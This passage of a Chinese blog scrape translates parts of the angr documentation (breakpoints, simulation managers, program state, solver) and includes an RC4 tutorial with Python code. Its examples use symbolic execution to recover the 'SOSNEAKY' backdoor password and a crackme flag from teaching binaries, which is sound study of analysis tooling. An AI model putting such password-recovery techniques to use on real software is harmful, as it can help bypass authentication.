添加一个断点，在发生内存写入之前放入ipdb \u0026gt;\u0026gt;\u0026gt; s.inspect.b('mem_write') # 或者，我们可以在内存写入发生之后立即触发断点 # 我们也可以运行一个回调函数而不是打开ipdb \u0026gt;\u0026gt;\u0026gt; def debug_func(state): print(\u0026quot;State %s is about to do a memory write!\u0026quot;) \u0026gt;\u0026gt;\u0026gt; s.inspect.b('mem_write', when=angr.BP_AFTER, action=debug_func) # 或者，你可以把它放到你的ipython中 \u0026gt;\u0026gt;\u0026gt; s.inspect.b('mem_write', when=angr.BP_AFTER, action=angr.BP_IPYTHON) 除了内存写入之外，还有其他很多地方可以设置断点。下面展示的是个可设置断点的事件列表，你都可以把他们设置为BP_BEFORE或BP_AFTER\nEvent type Event meaning mem_read 内存被读取时 mem_write 内存被写入时 address_concretization 正在解析符号化内存访问 reg_read 一个寄存器被读取时 reg_write 一个寄存器被写入时 tmp_read 一个临时变量被读取时 tmp_write 一个临时变量被写入时 expr 正在创建表达式（即获得算术运算的结果或IR中的常数） statement 正在翻译一个IR声明（statement） instruction 正在翻译一条新的（本机）指令 irsb 正在翻译一个基本块 constraints 新的约束被添加到state中 exit 正在从执行中生成后继状态 fork 一个符号执行状态分叉成多个状态 symbolic_variable 正在创建一个新的符号变量 call 正在执行call指令 return 正在执行ret指令 simprocedure 正在执行simprocedure（或syscall） dirty 正在执行dirty IR callback syscall syscall被执行（除了simprocedure事件之外的调用） engine_process SimEngine即将处理一些代码 这些事件拥有不同的属性：\n（表格太长不搬了）链接：https://docs.angr.io/core-concepts/simulation\n这些属性可以在适当的断点回调期间作为state.inspect的成员访问，以获取适当的值。你甚至可以修改这些值来为你所用\n\u0026gt;\u0026gt;\u0026gt; def track_reads(state): ... print('Read', state.inspect.mem_read_expr, 'from', state.inspect.mem_read_address) ... \u0026gt;\u0026gt;\u0026gt; s.inspect.b('mem_read', when=angr.BP_AFTER, action=track_reads) 此外，这些属性都可以作为inspect.b的参数，使断点被条件约束：\n# 如果0x1000是目标表达式的可能值，则将会在内存写入之前触发断点 \u0026gt;\u0026gt;\u0026gt; s.inspect.b('mem_write', mem_write_address=0x1000) # 如果0x1000是目标表达式的唯一可能值，则将在内存写入之前触发断点 \u0026gt;\u0026gt;\u0026gt; s.inspect.b('mem_write', mem_write_address=0x1000, mem_write_address_unique=True) # 若0x1000是从内存中读取的最后一个表达式的可能值，则会在0x8000指令之后触发断点 \u0026gt;\u0026gt;\u0026gt; s.inspect.b('instruction', when=angr.BP_AFTER, instruction=0x8000, mem_read_expr=0x1000) 事实上，我们甚至可以指定一个函数作为条件\n# 这是一个复杂条件，它确保RAX为0x41414141并且从0x8004开始的基本块在此路径之前的某个时间执行 \u0026gt;\u0026gt;\u0026gt; def cond(state): ... return state.eval(state.regs.rax, cast_to=str) == 'AAAA' and 0x8004 in state.inspect.backtrace \u0026gt;\u0026gt;\u0026gt; s.inspect.b('mem_write', condition=cond) 关于使用mem_read断点的注意事项 每当程序读取内存时，就会触发mem_read断点。如果在设置这种断点的同时还使用state.mem从内存地址加载数据，那么断点也将被触发\n因此，如果你想从内存中加载数据而不触发mem_read断点，请使用state.memory.load携带关键词参数disabl_actions=True和inspect=False\n对于state.find方法也同上\n","id":6,"section":"posts","summary":"Execution Engines 当你使用angr进行单步执行时，某些东西实际地进行了执行，即angr的一系列引擎（SimEngine的子类），它们会模拟给定代码段对输入","tags":["reverse","angr"],"title":"angr文档翻译（七）Execution Engines","uri":"https://blog.dx39061.top/2022/09/execution_engines/","year":"2022"},{"content":"Simulation Managers Simulation Manager是angr中最重要的控制模块，它让你能够控制不同状态的符号执行，使用搜索策略来探索程序的状态空间。在这一节中，你将学会如何使用它。\nSimulation Manager让你以一种巧妙的方式处理多个状态。多种状态组成“存储区（stashes）”，你可以任意前进、过滤、合并和移动。例如，你可以以不同速率步进两个不同的存储区，然后将它们合并在一起。大多数操作的默认存储区是active存储区，当你初始化simlation manager时，状态就放在里面。\n单步执行（Stepping） simulation manager最基础的功能是通过.step()将默认存储区的所有状态向前推进一个基本块。\n\u0026gt;\u0026gt;\u0026gt; import angr \u0026gt;\u0026gt;\u0026gt; proj = angr.Project('examples/fauxware/fauxware', auto_load_libs=False) \u0026gt;\u0026gt;\u0026gt; state = proj.factory.entry_state() \u0026gt;\u0026gt;\u0026gt; simgr = proj.factory.simgr(state) \u0026gt;\u0026gt;\u0026gt; simgr.active [\u0026lt;SimState @ 0x400580\u0026gt;] \u0026gt;\u0026gt;\u0026gt; simgr.step() \u0026gt;\u0026gt;\u0026gt; simgr.active [\u0026lt;SimState @ 0x400540\u0026gt;] 当然，存储区模型真正的威力在于，当一个状态遇到符号分支条件时，两个后继状态都会出现在存储区中，然后你可以同步执行两个分支。当你并不关心程序控制流只想单步执行到结束时，可以使用.run()方法\n# 运行直到第一个符号分支 \u0026gt;\u0026gt;\u0026gt; while len(simgr.active) == 1: ... simgr.step() \u0026gt;\u0026gt;\u0026gt; simgr \u0026lt;SimulationManager with 2 active\u0026gt; \u0026gt;\u0026gt;\u0026gt; simgr.active [\u0026lt;SimState @ 0x400692\u0026gt;, \u0026lt;SimState @ 0x400699\u0026gt;] # 运行直到程序退出 \u0026gt;\u0026gt;\u0026gt; simgr.run() \u0026gt;\u0026gt;\u0026gt; simgr \u0026lt;SimulationManager with 3 deadended\u0026gt; 我们现在有3个挂掉的状态！当一个状态在执行过程中没有产生任何后继状态时，例如，程序执行到了exit系统调用，这个状态就会被从active存储区移除放到deadended存储区中\n存储区管理（Stash Management） 让我们看看如何使用其他存储区。\n要在存储区之间移动一个状态，可以使用.move()方法，参数为from_stash``to_stash和filter_func（可选的，默认是移动一切）。例如，我们可以移动输出中包含热指定字符串的state：\n\u0026gt;\u0026gt;\u0026gt; simgr.move(from_stash='deadended', to_stash='authenticated', filter_func=lambda s: b'Welcome' in s.posix.dumps(1)) \u0026gt;\u0026gt;\u0026gt; simgr \u0026lt;SimulationManager with 2 authenticated, 1 deadended\u0026gt; 我们在移动指定state的同时，创建了一个叫“authenticated”的存储区。存储区中每个state在其标准输出中都有“Welcome”，这是一个很好的做法。\n每个存储区都只是一个列表，你可以使用下表索引或迭代访问每个单独的state，但是也有一些方法可以替代使用。如果你在存储区名前加一个one_前缀，你将得到存储区中的第一个state。如果你在存储区名前加一个mp_前缀，你将得到该存储区的mulpyplexed版本\n\u0026gt;\u0026gt;\u0026gt; for s in simgr.deadended + simgr.authenticated: ... print(hex(s.addr)) 0x1000030 0x1000078 0x1000078 \u0026gt;\u0026gt;\u0026gt; simgr.one_deadended \u0026lt;SimState @ 0x1000030\u0026gt; \u0026gt;\u0026gt;\u0026gt; simgr.mp_authenticated MP([\u0026lt;SimState @ 0x1000078\u0026gt;, \u0026lt;SimState @ 0x1000078\u0026gt;]) \u0026gt;\u0026gt;\u0026gt; simgr.mp_authenticated.posix.dumps(0) MP(['\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00SOSNEAKY\\x00', '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00S\\x80\\x80\\x80\\x80@\\x80@\\x00']) 当然，step``run和其他操作单个存储区的方法都可以携带一个stash参数，指明是对那个存储区操作\nsimulation manager为你提供了许多有趣的工具来管理存储区。我们暂时不会讨论其他内容，你可以查看API文档了解细节。\n存储区类型（Stash types） 你可以任意使用存储区，但有一些存储区被用来对某些特殊类型的状态进行分类。\nactive：此存储器包含默认情况下使用step方法会被执行的state，除非特别指定了存储区\ndeadended：当一个state由于某种原因不能继续执行时，它会进入deadended存储区，包括没有更多有效指令，所有后继状态无解和无效的指令指针。\npruned：当使用LAZY_SOLVES时，非必要不会检查状态是否满足。当在LAZY_SOLVES存在时约束条件不满足时，state会遍历层次结构，找到最初不满足的state，该状态的所有后继状态都会被剪除并放入此存储区中\nunconstrained：当Simulation Manager的构造函数被指定save_unconstrained选项时，则将被确定为不受约束的state放在此存储区\nunsat：当Simulation Manager的构造函数被指定save_unsat选项时，则将被确定为不满足约束（有矛盾约束）的state放在此存储区\n还有一个不是存储区的state列表：errored，如果在符号执行期间发生错误，则state将被包装在ErrorRecord对象中，其中包含state和它引发的错误信息，然后这条记录将被插入到errored中。你可以通过record.state获取错误发生之前的状态，通过record.error得到引发的错误，并且你可以通过record.debug()在引发错误的位置启动调试shell，这是一个非常宝贵的调试工具！\n简单的符号执行探索（Simple Exploration） 运用符号执行的一个常见的目的是得到程序运行到特定地址时的状态，同时丢弃通过另一个地址的所有状态，simulation manager有这个模式的快捷方法，可以使用explore()方法\n当使用.explore()方法并携带find参数时，符号执行将一直进行直到得到与查找条件匹配的状态，find参数可以是某个地址，也可以是某些地址组成的列表，还可以是接受state参数返回是否成功的断言的函数。当active存储区中的任何状态与find的条件匹配时，这些state会被放进found存储区，并且中止符号执行。之后你可以继续符号执行探索found存储区中的状态，或者丢弃这些状态并继续其他状态。你还可以使用avoid指定与find相同的条件参数，当一个状态符合avoid条件时，它会被放进avoid存储区中，并继续执行。最终，num_find参数控制在angr结束之前应该找到的状态数，默认值为1。当然，如果你在找到足够数量满足条件的状态之前用完了active存储区中所有的状态，则无论如何都会停止执行。\n我们以crackme程序为例\n首先，我们要加载这个二进制程序\n\u0026gt;\u0026gt;\u0026gt; proj = angr.Project('examples/CSCI-4968-MBE/challenges/crackme0x00a/crackme0x00a') 下一步，创建Simulation Manager\n\u0026gt;\u0026gt;\u0026gt; simgr = proj.factory.simgr() 现在，我们进行符号执行直到我们找到一个状态符合我们指定的条件\n\u0026gt;\u0026gt;\u0026gt; simgr.explore(find=lambda s: b\u0026quot;Congrats\u0026quot; in s.posix.dumps(1)) \u0026lt;SimulationManager with 1 active, 1 found\u0026gt; 现在，我们可以从state中得到flag\n\u0026gt;\u0026gt;\u0026gt; s = simgr.found[0] \u0026gt;\u0026gt;\u0026gt; print(s.posix.dumps(1)) Enter password: Congrats! \u0026gt;\u0026gt;\u0026gt; flag = s.posix.dumps(0) \u0026gt;\u0026gt;\u0026gt; print(flag) g00dJ0B! 十分简单，不是吗？\n探索技术（Expolration Techniques） angr附带了几个固定功能，可以让你自定义Simulation Manager的行为，这些功能叫做expolration techniques。至于为什么要使用探索技术，一个典型的例子是可以修改探索程序状态空间的模式，默认“一次执行所有操作”策略实际上是广度优先搜索，但是通过探索技术，你可以实现深度优先搜索。这些技术的能力远比这个例子更加灵活——你可以完全改变angr执行的行为。编写自己的探索技术将在后面的章节中介绍。\n要使用探索技术，请调用simgr.use_technique(tech)，其中tech是EXploration Technique子类的一个实例。angr内置的探索技术可以在angr.exploration_techniques找到\n下面是一些内置技术的概览：\nDFS：深度优先搜索，active存储区只存放一个state，其他state被放入deferred存储区直到active存储区的state终止或产生错误\nExplorer：这个技术实现了.explore()方法，可以指定explore和avoid\nLengthLimiter：限制状态通过路径的最大长度\nLoopSeer：使用循环计数的合理近似值来暂时丢弃通过循环次数过多的状态，将他们放入spinning存储区，如果其他可行的状态被用完，则重新将他们拉出使用\nManualMergepoint：将程序中一个地址标记为合并点，到达该地址的状态将被暂时保存，并且在超时时间内到达同一点的其他状态都将被合并在一起。\nMemoryWatcher：监控simgr执行过程中系统内存空闲，如果变得太低，则停止执行\nOppologist：“operation apologist”是一个特别有趣的小工具——如果启用此技术并且angr遇到不受支持的指令，例如，一个奇怪的外来浮点SIMD操作，它会将所有输入具体化并使用unicorn引擎模拟单个指令，从而允许继续执行\nSpiller：当active存储区状态过多时，此技术可以将其中一些状态转存到磁盘以保持较低的内存消耗\nThreading：将线程级并行性添加到执行过程。由于python的全局解释器锁，这并没有多大帮助，但是如果你有一个程序的分析花费大量时间在angr的本机代码依赖项（unicorn、z3、libvex）中，你可能会获得一些收益\nTracer：一种探索技术，它使符号执行遵循从其他来源记录的动态跟踪。动态跟踪器存储库有一些工具可以生成这些跟踪\nVeritesting：关于自动识别有用合并点的CMU论文的实现，它十分有用，你可以在构造Simulation Manager时使用veritesting=True参数来开启这个技术！请注意，由于它实现的是静态符号执行的侵入性方式，它通常不能与其他技术配合使用。\n查看Simulation Manager和探索技术的API文档以获取更多信息\n","id":7,"section":"posts","summary":"Simulation Managers Simulation Manager是angr中最重要的控制模块，它让你能够控制不同状态的符号执行，使用搜索策略来探索程序的状态空间。在这一节中，你将学会如","tags":["reverse","angr"],"title":"angr文档翻译（六）Simulation Managers","uri":"https://blog.dx39061.top/2022/09/simulation_manager/","year":"2022"},{"content":"Program State 到目前为止，我们只使用了angr的程序状态模拟（SimState objects），以最简单的方式展示了有关angr的基本操作。这一节中，你将了解state对象的结构以及如何与state交互。\n回顾：读写内存和寄存器（Review: Reading and writing memory and registers） 如果你按顺序读了该文档之前的内容（你也应该这样做，至少应该按顺序读完第一部分），你已经了解了访问内存和寄存器的基本操作，state.regs接受寄存器名称作为参数可以对寄存器进行读写，state.mem可以用地址作为索引获取相应地址的值，索引后可以指定数据类型。\n以下是一些示例：\n\u0026gt;\u0026gt;\u0026gt; import angr, claripy \u0026gt;\u0026gt;\u0026gt; proj = angr.Project('/bin/true') \u0026gt;\u0026gt;\u0026gt; state = proj.factory.entry_state() # 把rsp的值复制到rbp \u0026gt;\u0026gt;\u0026gt; state.regs.rbp = state.regs.rsp # 把rdx的值存到地址为0x1000内存中 \u0026gt;\u0026gt;\u0026gt; state.mem[0x1000].uint64_t = state.regs.rdx # 改变rbp所指向的地址 \u0026gt;\u0026gt;\u0026gt; state.regs.rbp = state.mem[state.regs.rbp].uint64_t.resolved # add rax, qword ptr [rsp + 8] \u0026gt;\u0026gt;\u0026gt; state.regs.rax += state.mem[state.regs.rsp + 8].uint64_t.resolved 基础执行（Basic Execution） 早些时候，我们展示了如何使用Simulation Manager来进行一些基本的执行。我们将在下一节展示Simulation Manager的全部功能，但我们现在可以使用一种各简单的接口state.step()来演示符号执行的工作原理。这个接口会进行一步符号执行，并返回一个SimSuccessors对象。与一般的模拟执行相比，符号执行可以产生多个可以按多种方式分类的后继状态。现在，我们关心的是这个对象的.successors属性，它会返回一个包含给定步骤的所有“正常”后续状态的列表。\n为什么返回的是一个列表，而不是一个唯一的后继状态？angr的符号执行过程只是将单个指令的操作编译到程序中并执行它们以改变SimState。当遇到像if(x\u0026gt;4)这样的代码时，如果x是符号变量会发生什么呢？在angr的底层某个地方，会处理x\u0026gt;4语句，结果将是\u0026lt;Bool x_32_1 \u0026gt; 4\u0026gt;\n这很好，但下一个问题是，我们是选择“true”分支还是“false”分支？答案是：两个分支都会被执行，产生两个完全独立的后继状态。在第一个state中，我们添加x\u0026gt;4作为约束条件，在第二个state中，我们添加!(x\u0026gt;4)作为约束条件。每当我们使用这些后继状态中的任何一个进行约束求解时，状态的条件确保我们得到的任何有效值都是有效的输入，这将导致重复执行遵循给定状态的路径\n为了证明这一点，让我们以fake firmware images为例，如果你查看这个二进制文件的源代码，你会发现固件的身份验证机制是存在后门的：任何用户名都可以通过密码“SOSNEAKY”获得管理员权限。更进一步来说，与用户输入的比较就是存在后门的，所以如果我们单步执行进行比较，获得多个后继状态。其中一种状态将包含将用户输入限制为后门密码的条件。以下代码片段实现了这一点：\n\u0026gt;\u0026gt;\u0026gt; proj = angr.Project('examples/fauxware/fauxware') \u0026gt;\u0026gt;\u0026gt; state = proj.factory.entry_state(stdin=angr.SimFile) # 目前请忽略这个配置，为了教学，我们禁用了更复杂的默认配置 \u0026gt;\u0026gt;\u0026gt; while True: ... succ = state.step() ... if len(succ.successors) == 2: ... break ... state = succ.successors[0] \u0026gt;\u0026gt;\u0026gt; state1, state2 = succ.successors \u0026gt;\u0026gt;\u0026gt; state1 \u0026lt;SimState @ 0x400629\u0026gt; \u0026gt;\u0026gt;\u0026gt; state2 \u0026lt;SimState @ 0x400699 不要直接去看这些状态的约束——我们刚经过的分支涉及到strcmp的结果，这是一个难以用符号方式模拟的函数，由此产生的约束非常复杂。\n我们模拟的程序从标准输入获取数据，默认情况下将其视为无限的符号数据流。为了进行约束求解，我们需要stdin实际内容的引用，我们稍后将会讨论我们的文件和输入子系统是如何工作的，但现在，只需使用state.posix.stdin.load(0, state.posix.stdin.size)取得到目前为止从标准输入读取的所有内容构成的bitvector。\n\u0026gt;\u0026gt;\u0026gt; input_data = state1.posix.stdin.load(0, state1.posix.stdin.size) \u0026gt;\u0026gt;\u0026gt; state1.solver.eval(input_data, cast_to=bytes) b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00SOSNEAKY\\x00\\x00\\x00' \u0026gt;\u0026gt;\u0026gt; state2.solver.eval(input_data, cast_to=bytes) b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00S\\x00\\x80N\\x00\\x00 \\x00\\x00\\x00\\x00' 正如你所见，为了进入state1路径，你必须将后门字符串“SOSNEAKY”作为密码，为了进入state2路径，你必须输入后门字符串以外的内容。z3打印了数十亿个符合的字符串之一。\nFauxware是第一个angr成功进行符号执行的程序，时间在2013年。通过使用angr找到它的后门，你正在参与一个伟大的传统，你已经对如何通过符号执行从二进制程序中获取有意义信息有了基本的了解！\n预设状态（State Presets） 在此之前，当我们操作state时，都会使用project.factory.entry_state()来创建一个新的状态，这只是angr可使用的几个构造函数之一：\n.blank_state()构造一个空白状态，它的大部分数据都未初始化，访问未初始化的数据时，会得到一个不带约束的符号值\n.entry_state()构造一个在main函数入口点的状态\n.full_init_state()构造一个准备好在main函数入口点之前运行的初始化程序执行。例如：共享库构造函数或预设初始化器，完成这些后，它将跳转到程序入口点\n.call_state()构造一个准备好执行给定函数的状态\n你可以通过以下构造函数参数自定义状态\n上述所有构造函数都可以使用addr参数指定开始执行的确切地址\n如果你在符号执行过程中需要命令行参数或环境变量，可以使用args列表或env字典传递参数，只有entry_state和full_init_state可使用。这些参数中的值可以是字符串或bitvector，都会被序列化为state中的args和env。默认的args是个空列表，所以哪怕你的程序只需要argv[0]，你都需要自己提供\n如果你需要使用符号化的argc，你可以将一个bitvector传递给argc参数，只有entry_state和full_init_state可使用。但是要小心，如果你这样做，你要添加一个约束：argc的值不能大于args的数量\n要使用call state，你应该使用.call_state(addr, arg1, arg2, ……)，addr是你要调用的函数的地址，argN是该函数的第n个参数，无论是python 整数、字符串、列表还是bitvector都可以。如果你想得到内存中指向一个对象的实际的指针，你应该将其包装在PointerWrapper中，即angr.PointerWrapper(\u0026quot;point to me!\u0026quot;)，这个API结果可能存在问题，我们正在努力改善\n使用call_state时若要指定函数的调用约定，可以使用cc参数传递一个SimCC实例。一般情况下angr会选择一个合适的方式作为默认值，但在特殊情况下，需要你手动指定\n在这些构造函数中还有更多的选项可以使用，更多详细信息，请参阅docs on the project.factory object (an AngrObjectFactory)\n内存底层接口（Low level interface for memory） state.mem接口便于从内存中加载特定类型的数据，但是当你想要对一段内存进行原样的加载和存储时，它就显的十分繁琐。事实上，state.mem的底层使用了state.memory，state.memory表示一个填充了bitvector的平坦地址空间。你可以使用state.memory.load(addr, size)和state.memory.store(addr, val)直接操作内存：\n\u0026gt;\u0026gt;\u0026gt; s = proj.factory.blank_state() \u0026gt;\u0026gt;\u0026gt; s.memory.store(0x4000, s.solver.BVV(0x0123456789abcdef0123456789abcdef, 128)) \u0026gt;\u0026gt;\u0026gt; s.memory.load(0x4004, 6) # 加载大小以字节为单位 \u0026lt;BV48 0x89abcdef0123\u0026gt; 正如你所见，数据以大端序进行加载和存储，因为state.memory的主要目的是加载没有附加语义的存储数据。但是，如果你想把它们转化为小端序，你可以设置endness为little-endian。endness的取值应该是archinfo包中Endness枚举量之一。此外，正在分析程序的字节序可以从arch.memory_endness得到，例如state.arch.memory_endness\n\u0026gt;\u0026gt;\u0026gt; import archinfo \u0026gt;\u0026gt;\u0026gt; s.memory.load(0x4000, 4, endness=archinfo.Endness.LE) \u0026lt;BV32 0x67452301\u0026gt; 还有一个用于寄存器访问的底层接口state.registers，使用方法与state.memory完全相同，但解释它的行为需要深入了解angr用于无缝处理多架构的抽象。简单来说它是一个寄存器文件，寄存器和偏移量的映射在archinfo中定义\n状态选项（State Options） 你可以使用一些状态选项对angr的内部进行很多小调整，这些调整在某些情况下会优化angr的行为，而在其他情况下会有所损害。\n在每个SimState对象上，都有一组启用的选项（state.options）。每个选项（实际上只是一个字符串）都以某种微小的方式控制angr执行引擎的行为。可以在附录中找到完整的选项列表及其默认值。你可以使用angr.options访问并向state添加某个选项。单个选项一般以大写字母命名，但也有一些你可能希望捆绑在一起使用的常用对象分组，以小写字母命名。\n无论用任何构造函数创建SimState时，你都可以使用参数add_options和remove_options传递从默认值修改的选项。\n# 例如: 启用lazy_solves, 这个选项会尽可能减少检查状态是否满足约束 # 对此设置的更改会影响此行之后所有由此状态创建的后继状态 \u0026gt;\u0026gt;\u0026gt; s.options.add(angr.options.LAZY_SOLVES) # 创建一个state并且开启lazy_solves \u0026gt;\u0026gt;\u0026gt; s = proj.factory.entry_state(add_options={angr.options.LAZY_SOLVES}) # 创建一个不启用simplification选项的新状态 \u0026gt;\u0026gt;\u0026gt; s = proj.factory.entry_state(remove_options=angr.options.simplification) 状态插件（State Plugins） 除了刚刚讨论的各种选项之外，存储在SimState中的所有内容实际上都存储在附加到state的各种插件中。到目前为止，我们讨论的几乎每个state属性（memory、registers、mem、regs、solver等等）都是可插拔的。这种设计允许代码模块化，以及模拟状态的其他方面轻松实现新型数据存储，或者使用其他插件替代实现。\n例如，普通的memory插件模拟了一个平坦的内存空间，但是分析时可以选择“abstract memory”插件，它使用地址的替代数据类型来模拟独立于地址的自由浮动内存映射，来提供state.memory。另一方面，插件可以降低代码复杂度：state.memory和state.registers实际上是同一个插件的两个不同实例，因为寄存器也是用地址空间模拟的。\n全局插件（The global plugin） state.globals是一个非常简单的插件：它实现了python dict相关的接口，允许你在state上存储任意数据。\n历史插件（The history plugin） state.history是一个非常重要的插件，用于存储符号执行过程中所采用路径的历史数据。它实际上是一些历史节点的链表，每一个节点代表一轮执行，你可以用state.history.parent.parent……来遍历这个列表\n为了让你更方便地访问历史数据，它还提供了针对某些值好用的迭代器。通常，这些值存储在history.recent_NAME，它们的迭代器可以通过history.NAME访问。例如，for addr in state.history.bbl_addrs: print hex(addr)会打印出经过的二进制基本块的地址，而state,history.recent_bbl_addrs是最近一步执行的基本块的列表，state.history.parent.recent_bbl_addrs是上一步执行的基本块列表。如果你需要快速访问这些值的平坦（flat）列表，可以使用.hardcopy，例如state.history.bbl_addrs.hardcopy。但请记住，基于索引的访问是在迭代器上实现的\n以下是存储在历史记录中的一些值的简要说明：\nhistory.descriptions是对每一轮执行的字符串描述列表\nhistory.bbl_addrs是执行的基本块地址的列表。每轮执行可能不止一个，并且并非所有地址都对应于二进制代码，有些可能是hook的SimProcedures的地址\nhistory.jumpkinds是历史中每个控制流处理的列表，以VEX枚举字符串形式展现\nhistory.jump_guards是历史中遇到的每个分支的条件列表\nhistory.events是执行期间发生的“有趣事件”的列表，例如符号跳转条件的存在、程序弹出消息框、退出代码终止程序执行\nhistory.actions通常为空，但如果你在state中添加state.options.refs，它将记录程序执行时内存、寄存器和临时值被访问的日志\n调用栈插件（The callstack plugin） angr会跟踪模拟程序的调用栈过程。在每条调用指令触发时，都会在调用栈的记录顶部添加一个帧（frame），而每当栈指针下降到最顶层帧以下时，就会弹出一个帧。这使angr能稳定地存储当前模拟函数的数据。\n和历史记录类似，调用栈记录也是由节点构成的链表，但angr并没有提供对节点内容的迭代器，取而代之的，你可以直接遍历state.callstack来获取每个活动帧的调用栈帧，按从最新到最旧排序，如果你想获取顶层帧，那么直接使用state.callstack\ncallstack.func_addr是当前正在执行的函数地址\ncallstack.call_site_addr是调用当前函数的基本块的地址\ncallsack.stack_ptr是从当前函数开始的栈指针的值\ncallstack.ret_addr是当前函数的返回地址\n更多关于I/O的信息：文件、文件系统、网络套接字（More about I/O: Files, file systems, and network sockets） 请参阅Working with File System, Sockets, and Pipes获取详细的文档\n复制和合并（Copying and Merging） state支持快速复制，以便你探索不同的分支\n\u0026gt;\u0026gt;\u0026gt; proj = angr.Project('/bin/true') \u0026gt;\u0026gt;\u0026gt; s = proj.factory.blank_state() \u0026gt;\u0026gt;\u0026gt; s1 = s.copy() \u0026gt;\u0026gt;\u0026gt; s2 = s.copy() \u0026gt;\u0026gt;\u0026gt; s1.mem[0x1000].uint32_t = 0x41414141 \u0026gt;\u0026gt;\u0026gt; s2.mem[0x1000].uint32_t = 0x42424242 state也可以合并在一起\n# 合并会返回一个元组，第一个元素是合并状态 # 第二个元素是描述状态标志的符号变量 # 第三个元素是一个布尔值，描述是否进行过合并 \u0026gt;\u0026gt;\u0026gt; (s_merged, m, anything_merged) = s1.merge(s2) # 现在这是一个可以解析为“AAAA”或“BBBB”的表达式 \u0026gt;\u0026gt;\u0026gt; aaaa_or_bbbb = s_merged.mem[0x1000].uint32_t TODO：描述合并的限制\n","id":8,"section":"posts","summary":"Program State 到目前为止，我们只使用了angr的程序状态模拟（SimState objects），以最简单的方式展示了有关angr的基本操作。这一节中，","tags":["reverse","angr"],"title":"angr文档翻译（五）Program State","uri":"https://blog.dx39061.top/2022/09/program_state/","year":"2022"},{"content":"RC algorithms RC algorithms 是由Ron Rivest设计的一系列加密算法，在逆向中常见到的RC4属于其中的一个，下面引自维基百科\nRC1 was never published. RC2 was a 64-bit block cipher developed in 1987. RC3 was broken before ever being used. RC4 is a stream cipher. RC5 is a 32/64/128-bit block cipher developed in 1994. RC6, a 128-bit block cipher based heavily on RC5, was an AES finalist developed in 1997. RC4 算法简介 RC4是一种流加密算法。所谓流加密，其核心思想是通过一系列算法生成较为随机的一串密钥流，然后将明文与密钥流异或得到密文，显然地，把密文再与密钥流异或即得到明文\nRC4获得随机密钥流依靠特定的密钥key打乱S盒，换句话说，key一定时，生成的密钥流是确定的\n算法属性 RC4是一种流加密算法\n密钥长度可变\n加解密使用同样密钥，属于对称加密算法\n算法过程 初始化S盒，一般是256个字节\n使用密钥key打乱S盒\n根据s盒生成密钥流\n明文/密文与密钥流异或得到密文/明文\npython实现 main函数 def main(): key = [1, 2, 3, 4, 5] # 准备一些变量 key_len = len(key) plain = \u0026quot;i_am_plain_text\u0026quot; plain_len = len(plain) cipher = [0] * plain_len s = [i for i in range(256)] # 初始化s盒 rc4_init(s, key, key_len) # 使用key打乱s盒 key_stream = rc4_generate_keystream(s[:], plain_len) # 生成密钥流 for i in range(plain_len): # 逐字节异或加密 cipher[i] = ord(plain[i]) ^ key_stream[i] 使用key打乱s盒 def rc4_init(s, key, key_len): j = 0 for i in range(256): j = (j + s[i] + key[i%key_len])%256 tmp = s[i] s[i] = s[j] s[j] = tmp 生成密钥流（这里是按明文长度生成 def rc4_generate_keystream(s, length): i = 0 j = 0 key_stream = [] while length: i = (i + 1) % 256 # 可以保证每256次循环后s盒中的每个元素至少被交换一次 j = (j + s[i]) % 256 tmp = s[i] s[i] = s[j] s[j] = tmp key_stream.append(s[(s[i] + s[j]) % 256]) length -= 1 return key_stream 逆向算法特征 256字节、值分别是0-255的S盒\n整个算法被分成两部分\n打乱S盒时j = (j + s[i] + key[i%key_len])%256并不常见\nRC2 RC2可作为DES算法的建议替代算法。 它的输入和输出都是64比特。 密钥的长度是从1字节到128字节可变，但1998年的实现是8字节。此算法被设计为可容易地在16位的微处理器上实现。\nto be continued\u0026hellip;\nRC5 RC5是一种因简洁著称的对称分组加密算法。它是参数可变的分组密码算法，三个可变的参数是：分组大小、密钥大小和加密轮数。 在此算法中使用了三种运算：异或、加和循环。\nto be continued\u0026hellip;\nRC6 RC6是基于RC5的128位块加密算法，实际上是由3个参数确定的一个加密算法族。\nto be continued\u0026hellip;\n","id":9,"section":"posts","summary":"RC algorithms RC algorithms 是由Ron Rivest设计的一系列加密算法，在逆向中常见到的RC4属于其中的一个，下面引自维基百科 RC1 was never published. RC2 was a 64-bit block cipher developed in 1987. RC3 was broken before","tags":["crypto"],"title":"逆向人学密码（三）RC algorithms","uri":"https://blog.dx39061.top/2022/09/rc_algorithms/","year":"2022"},{"content":"Solver Engine angr的强大之处并不在于它是个模拟器，而在于它能够使用符号变量进行符号执行。与其说一个变量对应一个具体的数值，不如说一个变量对应着一个符号，实际上只是一个名字。使用这些变量执行算术运算将产生一棵操作树（在编译原理中称为抽象语法树或AST）。AST可以转化成SMT求解器（如z3）的约束，以便提出诸如“给定经过此造作序列之后的输出，输入必须是什么？”之类的问题，这一节里，你将学会如何用angr来回答这个问题。\n使用Bitvectors（Working with Bitvectors） 让我们加载得到project和state，开始我们的数字游戏。\n\u0026gt;\u0026gt;\u0026gt; import angr, mokeyhex \u0026gt;\u0026gt;\u0026gt; proj = angr.Project('/bin/true') \u0026gt;\u0026gt;\u0026gt; state = proj.factory.entry_state() bitvector只是一个比特序列，在进行算术时和有界整数有相同的语义。让我们试着创建几个bitvector\n# 具有具体值1和100的64位bitvector \u0026gt;\u0026gt;\u0026gt; one = state.solver.BVV(1, 64) \u0026gt;\u0026gt;\u0026gt; one \u0026lt;BV64 0x1\u0026gt; \u0026gt;\u0026gt;\u0026gt; one_hundred = state.solver.BVV(100, 64) \u0026gt;\u0026gt;\u0026gt; one_hundred \u0026lt;BV64 0x64\u0026gt; # 创建一个带有具体值9的27位bitvector \u0026gt;\u0026gt;\u0026gt; weird_nine = state.solver.BVV(9, 27) \u0026gt;\u0026gt;\u0026gt; weird_nine \u0026lt;BV27 0x9\u0026gt; 正如你所见，你可以使用任何长度的比特序列构造bitvector，你也可以用它们进行数学运算：\n\u0026gt;\u0026gt;\u0026gt; one + one_hundred \u0026lt;BV64 0x65\u0026gt; # 你可以使用python整数来构造bitvector,它们将被强制转换为适当的类型 \u0026gt;\u0026gt;\u0026gt; one_hundred + 0x100 \u0026lt;BV64 0x164\u0026gt; # 可以实现算法的正常语义适用 \u0026gt;\u0026gt;\u0026gt; one_hundred - one*200 \u0026lt;BV64 